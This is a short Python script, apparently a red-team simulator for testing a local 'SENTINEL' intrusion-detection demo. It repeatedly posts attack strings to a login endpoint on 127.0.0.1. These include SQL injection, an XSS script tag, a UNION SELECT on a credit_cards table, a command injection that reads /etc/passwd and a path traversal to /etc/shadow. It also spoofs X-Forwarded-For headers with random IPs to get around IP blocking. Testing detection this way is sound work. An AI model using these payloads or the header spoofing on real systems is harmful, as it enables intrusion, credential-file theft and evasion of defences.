# attacks/injection_tool.py
import requests
import time
import random

TARGET_URL = "http://127.0.0.1:5000/login_attempt"

# ENTERPRISE LEVEL PAYLOADS
payloads = [
    "admin' OR 1=1 --",                   # SQLi
    "<script>alert('HACKED')</script>",   # XSS
    "UNION SELECT * FROM credit_cards",   # Data Exfiltration
    "; cat /etc/passwd",                  # Command Injection (CRITICAL - Score 100)
    "admin_bypass",                       # Honeypot Trigger (CRITICAL)
    "../../etc/shadow"                    # Path Traversal
]

def get_spoofed_ip():
    """Generates a random public IP to simulate global attacks"""
    return f"{random.randint(11,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"

print("SENTINEL RED-TEAM ADVANCED ATTACK SIMULATOR")
print(f"Targeting: {TARGET_URL}")
print("Initiating Global IP Spoofing Engine...")
time.sleep(1)

try:
    while True:
        attack = random.choice(payloads)
        fake_ip = get_spoofed_ip()
        headers = {'X-Forwarded-For': fake_ip} # Sending spoofed IP

        print(f"[\033[91mATTACK\033[0m] Origin: {fake_ip} | Payload: {attack}")
        
        try:
            response = requests.post(TARGET_URL, data={'username': attack, 'password': '123'}, headers=headers, timeout=2)
            
            if response.status_code == 403:
                print(f" FAILED: IP {fake_ip} was Auto-Blocked by SENTINEL SOAR!")
            else:
                print(" Payload Sent. Waiting for SIEM response...")
                
        except Exception as e:
            print(" Connection Refused (Server down or IP banned at network level)")
            
        time.sleep(random.uniform(1.5, 3.5)) # Random delay to mimic real attacks
        
except KeyboardInterrupt:
    print("\n Red-Team Attack Stopped.")